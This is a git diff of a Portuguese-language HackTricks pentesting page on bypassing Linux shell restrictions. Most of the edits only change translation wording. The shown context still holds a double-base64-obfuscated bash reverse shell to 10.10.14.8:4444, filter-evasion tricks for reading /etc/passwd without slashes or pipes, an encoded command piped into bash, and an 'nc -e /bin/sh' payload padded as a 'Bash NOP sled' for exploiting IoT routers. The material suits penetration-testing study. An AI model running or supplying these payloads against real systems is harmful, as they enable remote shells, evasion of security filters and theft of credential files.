@@ -1,4 +1,4 @@
-# Bypass de Restrições do Linux
+# Contornar Restrições do Linux
 
 {{#include ../../../banners/hacktricks-training.md}}
 
@@ -10,7 +10,7 @@
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Rev shell curta
+### Rev shell curto
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Contornar caminhos e palavras proibidas
+### Bypass de Paths e palavras proibidas
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -105,12 +105,12 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Bypass de backslash e slash
+### Bypass de barra invertida e barra
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Contornar pipes
+### Bypass de pipes
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -124,7 +124,7 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Contornar IPs
+### Bypass de IPs
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -144,8 +144,8 @@ Você poderia usar **burpcollab** ou [**pingb**](http://pingb.in), por exemplo.
 
 ### Builtins
 
-Caso não consiga executar funções externas e tenha acesso apenas a um **conjunto limitado de builtins para obter RCE**, existem alguns truques úteis para fazer isso. Normalmente, você **não poderá usar todos** os **builtins**, portanto, deve **conhecer todas as suas opções** para tentar contornar o jail. Ideia de [**devploit**](https://twitter.com/devploit).\
-Primeiro, verifique todos os [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Depois, veja algumas **recomendações**:
+Caso não consiga executar funções externas e tenha acesso apenas a um **conjunto limitado de builtins para obter RCE**, existem alguns truques úteis para fazer isso. Normalmente, você **não poderá usar todos** os **builtins**, portanto deve **conhecer todas as suas opções** para tentar contornar o jail. Ideia de [**devploit**](https://twitter.com/devploit).\
+Primeiro, verifique todos os [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Depois, aqui estão algumas **recomendações**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -296,15 +296,13 @@ ln /f*
 ```
 ## Bypass de Read-Only/Noexec/Distroless
 
-Se você estiver dentro de um filesystem com as proteções **read-only e noexec** ou até mesmo em um container distroless, ainda existem maneiras de **executar binários arbitrários, até mesmo um shell!:**
-
+Se você estiver dentro de um filesystem com as **proteções read-only e noexec** ou até mesmo em um container distroless, ainda existem maneiras de **executar binários arbitrários, até mesmo um shell!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Bypass de Chroot e outras Jails
-
+## Bypass de Chroot e outros Jails
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -312,31 +310,30 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Quando uma vulnerabilidade permite controlar parcialmente um argumento que, por fim, chega a `system()` ou a outro shell, talvez você não saiba o offset exato no qual a execução começa a ler seu payload.  NOP sleds tradicionais (por exemplo, `\x90`) **não** funcionam na sintaxe de shell, mas o Bash ignora inofensivamente os espaços em branco iniciais antes de executar um comando.
+Quando uma vulnerabilidade permite que você controle parcialmente um argumento que, em última instância, chega a `system()` ou a outro shell, talvez você não saiba o offset exato no qual a execução começa a ler seu payload.  Os NOP sleds tradicionais (por exemplo, `\x90`) **não** funcionam na sintaxe de shell, mas o Bash ignora inofensivamente os espaços em branco iniciais antes de executar um comando.
 
-Portanto, você pode criar um *NOP sled para Bash* prefixando seu comando real com uma longa sequência de espaços ou caracteres de tabulação:
+Portanto, você pode criar um *NOP sled para Bash* prefixando seu comando real com uma longa sequência de espaços ou caracteres de tabulação:<sup>[[5]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Se uma cadeia ROP (ou qualquer primitive de corrupção de memória) fizer o instruction pointer cair em qualquer ponto dentro do bloco de espaços, o parser do Bash simplesmente ignora os espaços em branco até alcançar `nc`, executando seu comando de forma confiável.
+Se uma cadeia ROP (ou qualquer primitive de memory-corruption) fizer o instruction pointer apontar para qualquer posição dentro do bloco de espaços, o parser do Bash simplesmente ignora os espaços em branco até alcançar `nc`, executando seu comando de forma confiável.
 
 Casos de uso práticos:
 
-1. **Blobs de configuração mapeados em memória** (por exemplo, NVRAM) acessíveis entre processos.
+1. **Blobs de configuração mapeados na memória** (por exemplo, NVRAM) que são acessíveis entre processos.
 2. Situações em que o atacante não pode escrever bytes NULL para alinhar o payload.
 3. Dispositivos embarcados nos quais apenas BusyBox `ash`/`sh` está disponível – eles também ignoram espaços iniciais.
 
-> 🛠️  Combine este truque com gadgets ROP que chamam `system()` para aumentar drasticamente a confiabilidade do exploit em roteadores IoT com memória limitada.
+> 🛠️  Combine este truque com ROP gadgets que chamam `system()` para aumentar drasticamente a confiabilidade do exploit em roteadores IoT com memória limitada.
 
-## Referências e mais informações
+## Referências
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
-
-- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../../banners/hacktricks-training.md}}
